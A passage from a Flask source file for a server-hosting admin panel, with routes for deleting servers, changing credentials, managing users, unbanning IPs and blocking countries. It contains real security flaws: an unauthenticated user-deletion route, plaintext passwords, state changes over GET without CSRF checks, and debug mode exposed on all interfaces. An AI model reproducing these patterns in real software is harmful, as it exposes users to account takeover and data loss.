        return jsonify({"error": "unauthorized"}), 401
    servers = load_servers()
    if server_id not in servers:
        return jsonify({"error": "not found"}), 404
    if servers[server_id]['owner'] != session['user'] and session.get('role') != 'admin':
        return jsonify({"error": "unauthorized"}), 403
    if server_id in running_processes:
        process = running_processes[server_id]
        if process.poll() is None:
            process.terminate()
            time.sleep(1)
            if process.poll() is None:
                process.kill()
        del running_processes[server_id]
    folder = get_server_folder(server_id)
    if os.path.exists(folder):
        shutil.rmtree(folder)
    del servers[server_id]
    save_servers(servers)
    return jsonify({"success": True})

@app.route('/api/update_credentials', methods=['POST'])
def update_credentials():
    if 'user' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    username = data.get('username')
    current_password = data.get('current_password')
    new_username = data.get('new_username')
    new_password = data.get('new_password')
    users = load_users()
    if username not in users:
        return jsonify({"error": "User not found"}), 404
    if users[username]['password'] != current_password:
        return jsonify({"error": "Current password is incorrect"}), 401
    if new_username and new_username != username:
        if new_username in users:
            return jsonify({"error": "Username already exists"}), 400
        users[new_username] = users.pop(username)
        session['user'] = new_username
        username = new_username
    if new_password:
        users[username]['password'] = new_password
    save_users(users)
    return jsonify({"success": True})

@app.route('/api/admin_monitor')
def admin_monitor():
    if 'user' not in session or session.get('role') != 'admin':
        return jsonify({"error": "Unauthorized"}), 401
    users = load_users()
    servers = load_servers()
    user_list = []
    for u, data in users.items():
        user_servers = [s for s in servers.values() if s.get('owner') == u]
        user_list.append({"username": u, "role": data.get('role', 'user'), "servers": len(user_servers)})
    server_list = []
    for sid, s in servers.items():
        server_list.append({"id": sid, "name": s.get('name', 'Unknown'), "owner": s.get('owner', 'Unknown'), "status": s.get('status', 'stopped')})
    return jsonify({"users": user_list, "servers": server_list})

# ========== ADMIN PANEL ==========
@app.route('/admin')
def admin_panel():
    if 'user' not in session or session.get('role') != 'admin':
        return "Access Denied", 403
    users = load_users()
    servers = load_servers()
    banned_ips = load_banned_ips()
    packages = load_packages()
    custom_orders = load_custom_orders()
    blocked_countries = load_blocked_countries()
    return render_template('admin.html', users=users, servers=servers, banned_ips=banned_ips,
                         packages=packages, custom_orders=custom_orders, blocked_countries=blocked_countries,
                         csrf_token=generate_csrf_token())

@app.route('/admin/unban_ip/<ip>')
def unban_ip(ip):
    if 'user' not in session or session.get('role') != 'admin':
        return "Access Denied", 403
    banned = load_banned_ips()
    if ip in banned:
        del banned[ip]
        save_banned_ips(banned)
    return redirect(url_for('admin_panel'))

@app.route('/admin/add_user', methods=['POST'])
def add_user():
    if 'user' not in session or session.get('role') != 'admin':
        return "Access Denied", 403
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    days = request.form.get('days', '')
    
    # حساب تاريخ الانتهاء
    if days.isdigit():
        expiry = (datetime.now() + timedelta(days=int(days))).strftime('%Y-%m-%d')
    else:
        expiry = "Unlimited"
        
    users = load_users()
    users[username] = {
        "password": password, 
        "role": "user", 
        "cpu": "AMD Ryzen 9 7950X", # قيم افتراضية قوية
        "ram": "16 GB", 
        "storage": "100 GB", 
        "cores": 8,
        "expiry": expiry,
        "created_at": datetime.now().isoformat()
    }
    save_users(users)
    # العودة إلى الصفحة السابقة (الداشبورد أو لوحة الأدمن)
    return redirect(request.referrer or url_for('dashboard'))

@app.route('/admin/delete_user/<username>')
def delete_user(username):
    if username == "xza123":
        return "Cannot delete admin"
    users = load_users()
    if username in users:
        servers = load_servers()
        servers_to_delete = [sid for sid, s in servers.items() if s.get('owner') == username]
        for sid in servers_to_delete:
            folder = get_server_folder(sid)
            if os.path.exists(folder):
                shutil.rmtree(folder)
            del servers[sid]
        save_servers(servers)
        del users[username]
        save_users(users)
    # العودة إلى الصفحة السابقة (الداشبورد أو لوحة الأدمن)
    return redirect(request.referrer or url_for('dashboard'))

@app.route('/admin/delete_custom_order/<order_id>')
def delete_custom_order(order_id):
    if 'user' not in session or session.get('role') != 'admin':
        return "Access Denied", 403
    orders = load_custom_orders()
    orders = [o for o in orders if o['id'] != order_id]
    save_custom_orders(orders)
    return redirect(url_for('admin_panel'))

@app.route('/admin/blocked_countries')
def admin_blocked_countries():
    if 'user' not in session or session.get('role') != 'admin':
        return "Access Denied", 403
    blocked = load_blocked_countries()
    return render_template('blocked_countries.html', blocked=blocked.get('blocked', []), csrf_token=generate_csrf_token())

@app.route('/admin/add_blocked_country', methods=['POST'])
def add_blocked_country():
    if 'user' not in session or session.get('role') != 'admin':
        return "Access Denied", 403
    country = request.form.get('country', '').upper()
    blocked = load_blocked_countries()
    if 'blocked' not in blocked:
        blocked['blocked'] = []
    if country and country not in blocked['blocked']:
        blocked['blocked'].append(country)
        save_blocked_countries(blocked)
    return redirect(url_for('admin_blocked_countries'))

@app.route('/admin/remove_blocked_country/<country>')
def remove_blocked_country(country):
    if 'user' not in session or session.get('role') != 'admin':
        return "Access Denied", 403
    blocked = load_blocked_countries()
    if country in blocked.get('blocked', []):
        blocked['blocked'].remove(country)
        save_blocked_countries(blocked)
    return redirect(url_for('admin_blocked_countries'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    os.makedirs(os.path.join(BASE_DIR, 'templates'), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, 'servers'), exist_ok=True)
    print("=" * 60)
    print("=" * 60)
    app.run(debug=True, host='0.0.0.0', port=5000)